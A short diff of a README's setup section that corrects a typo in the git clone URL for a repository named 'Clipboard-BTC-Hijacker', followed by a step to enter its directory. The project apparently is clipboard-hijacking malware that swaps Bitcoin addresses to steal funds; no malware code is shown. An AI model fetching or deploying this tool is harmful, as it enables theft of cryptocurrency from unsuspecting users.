@@ -18,7 +18,7 @@
 
 1. **Clone the Repository:**
    ```bash
-   git clone https://github.com/0xxnum/Clipboard-BTC-Hijacker).git
+   git clone https://github.com/0xxnum/Clipboard-BTC-Hijacker.git
 2. **Navigate to the Project Directory:**
   ```bash
    cd Clipboard-BTC-Hijacker
